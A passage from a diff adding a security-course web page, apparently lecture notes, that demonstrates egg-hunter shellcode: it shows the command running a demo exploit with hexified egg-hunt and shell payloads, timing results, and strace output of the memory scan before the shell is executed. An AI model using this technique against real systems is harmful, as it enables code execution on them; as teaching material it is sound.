+</p>
+
+<pre class="example">
+./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell))
+</pre>
+
+<p>
+The first argument will be executed by the dummy<sub>exploit</sub> program,
+which will find the huntable shell code, the second argument. How long
+does it take?
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ time ./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell)) &lt; /dev/null
+
+real	0m10.775s
+user	0m1.776s
+sys	0m7.192s
+</pre>
+
+<p>
+Notice, most of that is the system call. And, if you run this with
+strace, you can see that happening.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$  strace -e raw=access ./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell))
+ccess(0x8ed2004, 0)                    = -1 (errno 14)
+access(0x8ed3004, 0)                    = -1 (errno 14)
+access(0x8ed4004, 0)                    = -1 (errno 14)
+access(0x8ed5004, 0)                    = -1 (errno 14)
+access(0x8ed6004, 0)                    = -1 (errno 14)
+access(0x8ed7004, 0)                    = -1 (errno 14)
+access(0x8ed8004, 0)                    = -1 (errno 14)
+access(0x8ed9004, 0)                    = -1 (errno 14)
+access(0x8eda004, 0)                    = -1 (errno 14)
+access(0x8edb004, 0)                    = -1 (errno 14)
+access(0x8edc004, 0)                    = -1 (errno 14)
+access(0x8edd004, 0)                    = -1 (errno 14)
+access(0x8ede004, 0)                    = -1 (errno 14)
+access(0x8edf004, 0)                    = -1 (errno 14)
+access(0x8ee0004, 0)                    = -1 (errno 14)
+access(0x8ee1004, 0)                    = -1 (errno 14)
+access(0x8ee2004, 0)                    = -1 (errno 14)
+access(0x8ee3004, 0)                    = -1 (errno 14)
+access(0x8ee4004, 0)                    = -1 (errno 14)
+access(0x8ee5004, 0)                    = -1 (errno 14)
+access(0x8ee6004, 0)                    = -1 (errno 14)
+access(0x8ee7004, 0)                    = -1 (errno 14)
+access(0x8ee8004, 0)                    = -1 (errno 14)
+access(0x8ee9004, 0)                    = -1 (errno 14)
+access(0x8eea004, 0)                    = -1 (errno 14)
+access(0x8eeb004, 0)                    = -1 (errno 14)
+access(0x8eec004, 0)                    = -1 (errno 14)
+(...)
+</pre>
+
+<p>
+Pausing &#x2026; this is moving at the page boundary, every 4096
+bytes. This region of memory is not accessible, but eventually &#x2026;
+</p>
+
+<pre class="example">
+(...)
+ccess(0xb7e38d2c, 0)                   = -1 (errno 2)
+access(0xb7e38d2d, 0)                   = -1 (errno 2)
+access(0xb7e38d2e, 0)                   = -1 (errno 2)
+access(0xb7e38d2f, 0)                   = -1 (errno 2)
+access(0xb7e38d30, 0)                   = -1 (errno 2)
+access(0xb7e38d31, 0)                   = -1 (errno 2)
+access(0xb7e38d32, 0)                   = -1 (errno 2)
+access(0xb7e38d33, 0)                   = -1 (errno 2)
+access(0xb7e38d34, 0)                   = -1 (errno 2)
+access(0xb7e38d35, 0)                   = -1 (errno 2)
+access(0xb7e38d36, 0)                   = -1 (errno 2)
+access(0xb7e38d37, 0)                   = -1 (errno 2)
+access(0xb7e38d38, 0)                   = -1 (errno 2)
+access(0xb7e38d39, 0)                   = -1 (errno 2)
+access(0xb7e38d3a, 0)                   = -1 (errno 2)
+access(0xb7e38d3b, 0)                   = -1 (errno 2)
+access(0xb7e38d3c, 0)                   = -1 (errno 2)
+access(0xb7e38d3d, 0)                   = -1 (errno 2)
+access(0xb7e38d3e, 0)                   = -1 (errno 2)
+access(0xb7e38d3f, 0)                   = -1 (errno 2)
+access(0xb7e38d40, 0)                   = -1 (errno 2)
+access(0xb7e38d41, 0)                   = -1 (errno 2)
+access(0xb7e38d42, 0)                   = -1 (errno 2)
+access(0xb7e38d43, 0)                   = -1 (errno 2)
+access(0xb7e38d44, 0)                   = -1 (errno 2)
+access(0xb7e38d45, 0)                   = -1 (errno 2)
+access(0xb7e38d46, 0)                   = -1 (errno 2)
+access(0xb7e38d47, 0)                   = -1 (errno 2)
+access(0xb7e38d48, 0)                   = -1 (errno 2)
+(...)
+</pre>
+
+<p>
+You get a region of memory that is accessible, and then you move 1
+byte at a type through it checking for the egg. Finally, at some point
+you find that egg, and you eat it -&#x2014; I mean you execute the shell.
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
